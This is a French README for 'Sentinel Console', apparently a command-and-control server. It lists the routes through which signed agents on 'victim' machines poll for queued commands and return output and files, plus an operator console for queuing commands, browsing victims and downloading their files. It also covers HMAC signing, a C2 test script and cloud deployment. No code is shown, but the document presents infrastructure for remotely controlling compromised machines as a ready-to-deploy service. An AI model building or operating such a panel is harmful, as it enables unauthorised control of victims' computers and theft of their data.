# Sentinel Console

Service de beacon et console opérateur. Node 20, une seule dépendance (`pg`).

## Ce que c'est

Un agent poll, la console met en file. Rien n'est jamais poussé vers un agent :
il fonctionne derrière un NAT, un proxy ou un portail captif, et le serveur ne
garde aucune socket longue à fuiter. Chaque requête est signée en HMAC-SHA256
sur `(agent id + horodatage + corps)`, donc une requête capturée n'est ni
rejouable hors fenêtre d'horloge, ni repointable sur un autre agent.

## Surface

| route | méthode | qui | rôle |
|---|---|---|---|
| `/healthz` | GET | public | sonde de santé |
| `/api/beacon` | POST | agent signé | enregistre/rafraîchit la victime, rend la file |
| `/api/result` | POST | agent signé | sortie de commande + fichiers |
| `/api/login` | POST | opérateur | cookie `sid` HttpOnly + Secure |
| `/api/victims` | GET | opérateur | grille |
| `/api/queue` | POST | opérateur | empile une ou plusieurs commandes |
| `/api/history` | GET | opérateur | historique + sorties |
| `/api/uploads` | GET | opérateur | fichiers reçus |
| `/api/download` | GET | opérateur | rapatrie un fichier |
| `/api/remove` | POST | opérateur | supprime une victime |

## Variables d'environnement

| clé | rôle |
|---|---|
| `DATABASE_URL` | chaîne Postgres, `sslmode` géré par le code |
| `AGENT_SECRET` | clé HMAC partagée avec l'agent |
| `SESSION_SECRET` | signature des cookies opérateur |
| `PANEL_PASS` | mot de passe de la console |

## Vérification

`python test_c2.py` rejoue la séquence complète — connexion, beacon signé,
signature falsifiée, horodatage périmé, mise en file, reprise, résultat, upload,
accès non authentifié — et retourne 0 seulement si les 24 assertions passent.

## Déploiement

`render.yaml` décrit le service ; les valeurs sensibles sont marquées
`sync: false` et se posent par l'API ou le dashboard, jamais dans le dépôt.
